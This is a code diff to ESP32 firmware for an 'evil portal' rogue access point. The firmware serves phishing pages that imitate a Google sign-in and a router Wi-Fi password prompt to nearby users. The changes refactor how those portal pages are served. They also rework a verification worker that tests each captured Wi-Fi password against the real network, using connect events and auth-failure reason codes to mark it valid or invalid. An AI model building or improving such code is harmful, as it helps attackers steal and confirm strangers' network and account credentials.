@@ -23,6 +23,10 @@
 static volatile bool s_running = false;
 static volatile bool s_paused = false;
 static volatile bool s_dns_run = false;
+static volatile bool s_verify_active = false;
+static volatile bool s_verify_connected = false;
+static volatile bool s_verify_failed = false;
+static volatile uint8_t s_verify_disconnect_reason = 0;
 static bool s_bt_was_on = false;
 static bool s_event_handlers_registered = false;
 
@@ -41,6 +45,18 @@ static void evil_ap_event_handler(void* arg, esp_event_base_t event_base, int32_
             ESP_LOGI(TAG, "AP_START");
         } else if(event_id == WIFI_EVENT_AP_STOP) {
             ESP_LOGI(TAG, "AP_STOP");
+        } else if(event_id == WIFI_EVENT_STA_CONNECTED) {
+            if(s_verify_active) {
+                ESP_LOGI(TAG, "[verify] STA_CONNECTED");
+                s_verify_connected = true;
+            }
+        } else if(event_id == WIFI_EVENT_STA_DISCONNECTED) {
+            if(s_verify_active) {
+                wifi_event_sta_disconnected_t* e = event_data;
+                ESP_LOGI(TAG, "[verify] STA_DISCONNECTED reason=%u", e->reason);
+                s_verify_disconnect_reason = e->reason;
+                s_verify_failed = true;
+            }
         }
     } else if(event_base == IP_EVENT && event_id == IP_EVENT_AP_STAIPASSIGNED) {
         ip_event_ap_staipassigned_t* e = event_data;
@@ -132,29 +148,12 @@ static void log_req_headers(httpd_req_t* req, const char* tag) {
     }
 }
 
-static void send_router_html(httpd_req_t* req, const char* error);
+static void send_portal_html(httpd_req_t* req, const char* error);
 
 static esp_err_t handler_root(httpd_req_t* req) {
     ESP_LOGI(TAG, "GET %s", req->uri);
     log_req_headers(req, "root");
-    if(s_verify_creds_enabled) {
-        send_router_html(req, NULL);
-        return ESP_OK;
-    }
-    httpd_resp_set_type(req, "text/html");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-    httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
-                    s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
-    return ESP_OK;
-}
-
-static esp_err_t handler_redirect(httpd_req_t* req) {
-    ESP_LOGI(TAG, "probe-redirect %s -> http://172.0.0.1/", req->uri);
-    log_req_headers(req, "probe");
-    httpd_resp_set_status(req, "302 Found");
-    httpd_resp_set_hdr(req, "Location", "http://172.0.0.1/");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-    httpd_resp_send(req, NULL, 0);
+    send_portal_html(req, NULL);
     return ESP_OK;
 }
 
@@ -251,13 +250,16 @@ static void send_html_with_substs(httpd_req_t* req, const char* html, const Html
     httpd_resp_send_chunk(req, NULL, 0);
 }
 
-static void send_router_html(httpd_req_t* req, const char* error) {
+// Send the currently active portal HTML (s_html_buf -- can be Google, Router,
+// or a custom SD template) with the standard placeholder substitutions.
+static void send_portal_html(httpd_req_t* req, const char* error) {
+    const char* html = s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE;
     HtmlSubst substs[] = {
         {"%ERROR%", error},
         {"%SSID_OPTIONS%", s_router_ssid_options},
         {NULL, NULL},
     };
-    send_html_with_substs(req, EVIL_PORTAL_HTML_ROUTER, substs);
+    send_html_with_substs(req, html, substs);
 }
 
 static const char EVIL_PORTAL_HTML_ROUTER_SUCCESS[] =
@@ -355,7 +357,7 @@ static esp_err_t handler_post(httpd_req_t* req) {
             httpd_resp_send(
                 req, EVIL_PORTAL_HTML_ROUTER_SUCCESS, sizeof(EVIL_PORTAL_HTML_ROUTER_SUCCESS) - 1);
         } else {
-            send_router_html(req, "Wrong password &mdash; please try again.");
+            send_portal_html(req, "Wrong password &mdash; please try again.");
         }
         return ESP_OK;
     }
@@ -373,14 +375,7 @@ static esp_err_t handler_catch_all(httpd_req_t* req, httpd_err_code_t err) {
     (void)err;
     ESP_LOGI(TAG, "catch-all %s -> serve portal", req->uri);
     log_req_headers(req, "catch");
-    if(s_verify_creds_enabled) {
-        send_router_html(req, NULL);
-        return ESP_OK;
-    }
-    httpd_resp_set_type(req, "text/html");
-    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
-    httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
-                    s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
+    send_portal_html(req, NULL);
     return ESP_OK;
 }
 
@@ -918,6 +913,12 @@ static void evil_portal_verify_worker(void* arg) {
     EpVerifyArgs* a = arg;
     a->result = false;
 
+    // Reset event flags and arm the handler
+    s_verify_connected = false;
+    s_verify_failed = false;
+    s_verify_disconnect_reason = 0;
+    s_verify_active = true;
+
     wifi_config_t sta_cfg = {0};
     strncpy((char*)sta_cfg.sta.ssid, a->ssid, sizeof(sta_cfg.sta.ssid) - 1);
     strncpy((char*)sta_cfg.sta.password, a->pwd, sizeof(sta_cfg.sta.password) - 1);
@@ -927,32 +928,60 @@ static void evil_portal_verify_worker(void* arg) {
 
     esp_wifi_disconnect();
     vTaskDelay(pdMS_TO_TICKS(100));
+    s_verify_failed = false; // ignore the disconnect we just triggered
 
     esp_err_t err = esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
     if(err != ESP_OK) {
         ESP_LOGE(TAG, "[verify]   set_config: %s", esp_err_to_name(err));
+        s_verify_active = false;
         return;
     }
 
     err = esp_wifi_connect();
     if(err != ESP_OK) {
         ESP_LOGE(TAG, "[verify]   connect: %s", esp_err_to_name(err));
+        s_verify_active = false;
         return;
     }
 
-    // Poll for association: 12 x 500ms = 6s, mirrors Bruce's behavior.
-    wifi_ap_record_t info;
-    for(int i = 0; i < 12; i++) {
-        vTaskDelay(pdMS_TO_TICKS(500));
-        if(esp_wifi_sta_get_ap_info(&info) == ESP_OK) {
-            ESP_LOGI(TAG, "[verify]   connected after %d ticks", i + 1);
+    // Wait up to 6s for either STA_CONNECTED or STA_DISCONNECTED. The ESP
+    // STA driver auto-reconnects on auth failure, so we keep watching for
+    // multiple disconnect events with auth-related reasons before giving up.
+    const int total_polls = 60; // 60 x 100 ms = 6 s
+    int auth_failures = 0;
+    for(int i = 0; i < total_polls; i++) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+        if(s_verify_connected) {
+            ESP_LOGI(TAG, "[verify]   STA associated after %d ms", (i + 1) * 100);
             a->result = true;
             break;
         }
+        if(s_verify_failed) {
+            uint8_t reason = s_verify_disconnect_reason;
+            // 200..207 = auth failure family on ESP-IDF
+            // 15 = WIFI_REASON_4WAY_HANDSHAKE_TIMEOUT (often = wrong password)
+            // 2  = WIFI_REASON_AUTH_EXPIRE
+            bool auth_related =
+                (reason == 2) || (reason == 15) || (reason >= 200 && reason <= 207);
+            if(auth_related) {
+                auth_failures++;
+                if(auth_failures >= 2) {
+                    ESP_LOGI(TAG, "[verify]   auth failed twice (reason=%u), aborting",
+                             reason);
+                    break;
+                }
+            }
+            s_verify_failed = false;
+        }
     }
 
+    s_verify_active = false;
+
     if(!a->result) {
-        ESP_LOGI(TAG, "[verify]   timeout, no association");
+        ESP_LOGI(TAG, "[verify]   result: INVALID (last reason=%u)",
+                 s_verify_disconnect_reason);
+    } else {
+        ESP_LOGI(TAG, "[verify]   result: VALID");
     }
 
     esp_wifi_disconnect();
